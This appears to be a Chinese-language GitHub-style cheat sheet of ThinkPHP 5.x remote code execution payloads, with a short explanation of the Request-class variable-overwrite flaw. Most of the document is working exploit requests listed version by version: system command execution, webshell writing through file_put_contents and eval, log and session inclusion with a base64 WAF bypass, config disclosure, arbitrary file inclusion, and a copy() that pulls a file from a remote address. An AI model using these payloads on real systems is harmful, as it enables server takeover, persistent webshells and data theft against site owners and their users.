# tp5rce
tp5rce各版本payload。
最近学了一下tp5rce漏洞，翻了一圈还是y4的payload比较全，特此做个备份，方便有需要时候再来翻。



# 技巧

- https://xz.aliyun.com/t/6106#toc-5
- http://r3start.net/index.php/2019/03/15/458

- php 7.1.7 (虽然assert 函数不在disable_function中，但已经无法用call_user_func回调调用)
- 写到tmp目录，进行包含

bypass getshell
1，写日志，包含日志 getshell 。payload如下：
```
写shell进日志
_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=<?php eval($_POST['x'])?>

通过日志包含getshell
_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=../data/runtime/log/201901/21.log&x=phpinfo();
```

2，写session，包含session getshell。payload如下：
```
写shell进session
POST /?s=captcha HTTP/1.1
Cookie: PHPSESSID=kking


_method=__construct&filter[]=think\Session::set&method=get&get[]=<?php eval($_POST['x'])?>&server[]=1

包含session getshell
POST /?s=captcha

_method=__construct&method=get&filter[]=think\__include_file&get[]=tmp\sess_kking&server[]=1
而这两种方式在这里都不可用，因为waf对<?php等关键字进行了拦截，还有其他办法吗？
```

绕过
第一步
```
POST /?s=captcha
Cookie: PHPSESSID=kktest

_method=__construct&filter[]=think\Session::set&method=get&get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&server[]=1
```
(payload前后两个ab同样是为了base64解码凑字符的原因)   

第二步
```
POST /?s=captcha&r=cGhwaW5mbygpOw==

_method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=tsetkk_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php

```






# 原理
payload分为两种类型，一种是因为Request类的method和__construct方法造成的(method可控，配合construct变量覆盖filter导致的)，另一种是因为Request类在兼容模式下获取的控制器没有进行合法校验(兼容模式默认开启,由于没有进行合法校验，导致可以任意类的任意方法)   

核心: 起点Request类的method和__construct造成的变量覆盖，终点filterValue。

- 第一种

`_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al`   

Request类的method方法$this->method可控导致可以调用__contruct()覆盖Request类的filter字段，然后App::run()执行判断debug来决定是否执行$request->param()，并且还有$dispatch['type'] 等于controller或者 method(captcha路由) 时也会执行$request->param()，而$request->param()会进入到input()方法，在这个方法中由于覆盖的filter进入了filterValue(),而该方法中就存在可利用d的call_user_func 函数造成rce。   

Request 类中的 param、route、get、post、put、delete、patch、request、session、server、env、cookie、input 方法均调用了 filterValue 方法
- 第二种

`?s=index/\think\Request/input&filter[]=system&data=pwd`  
某些版本可以不要`/\`   
`?s=index/think\config/get&name=database.username`

开启兼容模式，未合法校验传入的控制器，导致任意类方法调用。

# payload

payload来自各大佬的总结。

5.1.x 
```
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\view\driver\Think/display&template=<?php phpinfo();?>             //shell生成在runtime/temp/md5(template).php
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=copy(%27远程地址%27,%27333.php%27)
```

5.0.x 
```
?s=index/think\config/get&name=database.username // 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg    // 包含任意文件
?s=index/\think\Config/load&file=../../t.php     // 包含任意.php文件
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=copy(%27远程地址%27,%27333.php%27)
```

```
ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debug
POST /
_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al
```

ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
```
POST /?s=xxx HTTP/1.1
_method=__construct&filter[]=system&method=get&get[]=ls+-al
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```

5.0
debug 无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.1
debug 无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.2
debug 无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.3
debug 无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.4
debug 无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.5
debug 无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```

5.0.6
debug 无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.7
debug 无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.8
debug 无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system

aaaa=whoami&_method=__construct&method=GET&filter[]=system

_method=__construct&method=GET&filter[]=system&get[]=whoami

c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.9
debug 无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.10
从5.0.10开始默认debug=false，debug无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.11
默认debug=false，debug无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.12
默认debug=false，debug无关 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
5.0.13
默认debug=false，需要开启debug 命令执行
5.0.13版本之后需要开启debug才能rce
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
s=whoami&_method=__construct&method=&filter[]=system
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```

5.0.14
默认debug=false，需要开启debug 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
```
5.0.15
默认debug=false，需要开启debug 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
```
5.0.16
默认debug=false，需要开启debug 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
```
5.0.17
默认debug=false，需要开启debug 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
```
5.0.18
默认debug=false，需要开启debug 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
```
5.0.19
默认debug=false，需要开启debug 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
```
5.0.20
默认debug=false，需要开启debug 命令执行
```
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
```
5.0.21
默认debug=false，需要开启debug 命令执行
```
POST ?s=index/index
_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc
```
写shell
```
POST
_method=__construct&filter[]=assert&server[REQUEST_METHOD]=file_put_contents('test.php','<?php phpinfo();')
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
POST ?s=captcha
_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc&method=get
```
5.0.22
默认debug=false，需要开启debug 命令执行
```
POST ?s=index/index
_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc
```
写shell
```
POST
_method=__construct&filter[]=assert&server[REQUEST_METHOD]=file_put_contents('test.php','<?php phpinfo();')
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
POST ?s=captcha
_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc&method=get
```
5.0.23
默认debug=false，需要开启debug 命令执行
```
POST ?s=index/index
_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc
```
写shell
```
POST
_method=__construct&filter[]=assert&server[REQUEST_METHOD]=file_put_contents('test.php','<?php phpinfo();')
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
POST ?s=captcha
_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc&method=get
```
5.0.24
作为5.0.x的最后一个版本，rce被修复

5.1.0
默认debug为true 命令执行
```
POST ?s=index/index
_method=__construct&filter[]=system&method=GET&s=calc
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
有captcha路由时无需debug=true "topthink/think-captcha": "2.*"
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
POST ?s=captcha
_method=__construct&filter[]=system&s=calc&method=get
```
5.1.1
命令执行
```
POST ?s=index/index
_method=__construct&filter[]=system&method=GET&s=calc
```
写shell
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```
有captcha路由时无需debug=true
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
POST ?s=captcha
_method=__construct&filter[]=system&s=calc&method=get
```


# 参考
https://y4er.com/post/thinkphp5-rce/
